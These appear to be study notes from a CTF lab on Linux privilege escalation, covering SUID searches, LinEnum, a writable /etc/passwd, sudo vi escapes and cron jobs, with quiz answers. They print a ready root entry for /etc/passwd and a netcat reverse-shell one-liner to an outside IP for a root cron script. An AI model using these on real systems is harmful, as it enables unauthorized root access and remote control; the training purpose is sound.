## Table of Contents

    - [To look for files with the SUID bit set -](#To\look\for\files\with\the\SUID\bit\set\-)
    - [Direction of Privilege Escalation](#Direction\of\Privilege\Escalation)
- [Enumeration](#enumeration)
- [Exploiting Writable /etc/passwd](#exploiting\writable\/etc/passwd)
    - [Escaping Vi Editor](#Escaping\Vi\Editor)
- [= ID](#=\id)

### To look for files with the SUID bit set - 
`find / -type f -perm -4000 2>/dev/null`


IP=10.10.49.29
Understanding Privesc

Involves goin from a lower permission to a higher permission. Could be exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usualyl restricted from the users


Rarely when doing a CTF or real-world penetration test, will you be able to gain a foothold (initial access) that affords you administrator access. Privilege escalation is crucial, because it lets you gain system administrator levels of access. This allow you to do many things, including:

-  Reset passwords  
    
-  Bypass access controls to compromise protected data
-  Edit software configurations
-  Enable persistence, so you can access the machine again later.
-  Change privilege of users
-  Get that cheeky root flag ;)

### Direction of Privilege Escalation
![](https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Common%20Linux%20Privesc/Resources/tree.png?raw=true)
**Horizontal privilege escalation:** This is where you expand your reach over the compromised system by taking over a different user who is on the same privilege level as you. For instance, a normal user hijacking another normal user (rather than elevating to super user). This allows you to inherit whatever files and access that user has. This can be used, for example, to gain access to another normal privilege user, that happens to have an SUID file attached to their home directory (more on these later) which can then be used to get super user access. [Travel sideways on the tree]  

****Vertical** **privilege escalation (privilege elevation):**** This is where you attempt to gain higher privileges or access, with an existing account that you have already compromised. For local privilege escalation attacks this might mean hijacking an account with administrator privileges or root privileges. [Travel up on the tree]
# Enumeration

**LinEnum**
bash script that performs common commans related to priv esc, saves time and effort to put toward root... Link : [LinEnum](https://github.com/rebootuser/LinEnum/master/LinEnum.sh)
First, lets SSH into the target machine, using the credentials [user3:password.](user3:password.)
First, lets SSH into the target machine, using the credentials [user3:password.](user3:password.) This is to simulate getting a foothold on the system as a normal privilege user.

Correct Answer

What is the target's hostname?  
`hostname- polobox`
Correct Answer

Look at the output of /etc/passwd how many "user[x]" are there on the system?  
cat /etc/passwd - 8
Correct Answer

How many available shells are there on the system?  
`4`
Correct Answer

What is the name of the bash script that is set to run every 5 minutes by cron?  
`cat /etc/crontab`
Correct Answer

 Hint

What critical file has had its permissions changed to allow some users to write to it?  
`cat /etc/passwd`
Correct Answer

 Hint

**Finding and Exploiting SUID Files**

The first step in Linux privilege escalation exploitation is to check for files with the SUID/GUID bit set. This means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!

**What is an SUID binary?**

As we all know in Linux everything is a file, including directories and devices which have permissions to allow or restrict three operations i.e. read/write/execute. So when you set permission for any file, you should be aware of the Linux users to whom you allow or restrict all three permissions. Take a look at the following demonstration of how maximum privileges (rwx-rwx-rwx) look:

r = read

w = write

x = execute  

    **user**     **group**     **others**  

    rwx       rwx       rwx  

    _421       421       421_
    
The maximum number of bit that can be used to set permission for each user is 7, which is a combination of read (4) write (2) and execute (1) operation. For example, if you set permissions using **"chmod"** as **755**, then it will be: rwxr-xr-x.

  
But when special permission is given to each user it becomes SUID or SGID. When extra bit **“4”** is set to user(Owner) it becomes **SUID** (Set user ID) and when bit **“2”** is set to group it becomes **SGID** (Set Group ID).  

Therefore, the permissions to look for when looking for SUID is:

SUID:

rws-rwx-rwx

GUID:

rwx-rws-rwx  

**Finding SUID Binaries**  

We already know that there is SUID capable files on the system, thanks to our LinEnum scan. However, if we want to do this manually we can use the command: **"find / -perm -u=s -type f 2>/dev/null"** to search the file system for SUID/GUID files. Let's break down this command.

find - init the find command
/ - whole file system
-perm - searches for files with certain permissions
-u=s - Any of the permission bits mode are set for the file. Symbolic modes are accepted in this form
-type f  -  Only search for files
2>/dev/null - suppresses errors


# Exploiting Writable /etc/passwd

continuing with the enumerationof users, we found that user7 is a member of the root group with gid 0. ant we already know from the linenum scan that /etc/passwd file is wriable for the user. so from this, we concluded that user7 can edit the /etc/passwd file. 

**Understanding /etc/passwd**
The /etc/passwd file stores essential information, which  is required during login. In other words, it stores user account information. The /etc/passwd is a **plain text file**. It contains a list of the system’s accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.

The /etc/passwd file should have general read permission as many command utilities use it to map user IDs to user names. However, write access to the /etc/passwd must only limit for the superuser/root account. When it doesn't, or a user has erroneously been added to a write-allowed group. We have a vulnerability that can allow the creation of a root user that we can access.

**Understanding /etc/passwd format**

The /etc/passwd file contains one entry per line for each user (user account) of the system. All fields are separated by a colon : symbol. Total of seven fields as follows. Generally, /etc/passwd file entry looks as follows:

    test:x:0:0:root:/root:/bin/bash

[as divided by colon (:)]  

1. **Username**: It is used when user logs in. It should be between 1 and 32 characters in length.
2. **Password**: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".  
    
3. **User ID (UID)**: Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4. **Group ID (GID)**: The primary group ID (stored in /etc/group file)
5. **User ID Info**: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
6. **Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7. **Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

**How to exploit a writable /etc/passwd**

It's simple really, if we have a writable /etc/passwd file, we can write a new line entry according to the above formula and create a new user! We add the password hash of our choice, and set the UID, GID and shell to root. Allowing us to log in as our own root user!

  
Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: **"openssl passwd -1 -salt [salt] [password]"**


new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash

### Escaping Vi Editor


**Sudo -l**

sudo -l  --> list what commands your able to use as a super use on that account. sometimes youll find your able to run certain cmd's as a root user without the root password. can enable you to escalate privs

**Escaping Vi**
**Escaping Vi**

Running this command on the "user8" account shows us that this user can run vi with root privileges. This will allow us to escape vim in order to escalate privileges and get a shell as the root user!

**Misconfigured Binaries and GTFOBins  
**

If you find a misconfigured binary during your enumeration, or when you check what binaries a user account you have access to can access, a good place to look up how to exploit them is GTFOBins. GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. It provides a really useful breakdown of how to exploit a misconfigured binary and is the first place you should look if you find one on a CTF or Pentest.

[https://gtfobins.github.io/](https://gtfobins.github.io/)
**What is Cron?**  

The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as one-time events or as recurring tasks. You can create a crontab file containing commands and instructions for the Cron daemon to execute.

**How to view what Cronjobs are active.**

We can use the command **"cat /etc/crontab"** to view what cron jobs are scheduled. This is something you should always check manually whenever you get a chance, especially if LinEnum, or a similar script, doesn't find anything.  

**Format of a Cronjob**

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 

# = ID  

m = Minute

h = Hour

dom = Day of the month

mon = Month

dow = Day of the week

user = What user the command will run as  

command = What command should be run  

For Example,  

**#  m   h dom mon dow user  command**  

17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly  

**How can we exploit this?**

We know from our LinEnum scan, that the file autoscript.sh, on user4's Desktop is scheduled to run every five minutes. It is owned by root, meaning that it will run with root privileges, despite the fact that we can write to this file. The task then is to create a command that will return a shell and paste it in this file. When the file runs again in five minutes the shell will be running as root.

What directory is the 'autoscript.sh' under? 
`find / -type f -name autoscript.sh 2>/dev/null`
/home/user4/Desktop/autoscript.sh

mkfifo /tmp/saujr; nc 10.6.34.114 8888 0</tmp/saujr | /bin/sh >/tmp/saujr 2>&1; rm /tmp/saujr

**Further Learning**  

There is never a "magic" answer in the huge area that is Linux Privilege Escalation. This is simply a few examples of basic things to watch out for when trying to escalate privileges_._The only way to get better at it, is to practice and build up experience. Checklists are a good way to make sure you haven't missed anything during your enumeration stage, and also to provide you with a resource to check how to do things if you forget exactly what commands to use.  

Below is a list of good checklists to apply to CTF or penetration test use cases.Although I encourage you to make your own using CherryTree or whatever notes application you prefer.  

- [https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)
- [https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)

**Thank you**  

Thanks for taking the time to work through this room, I wish you the best of luck in future.

~ Polo  

Answer the questions below

Well done, you did it!

















































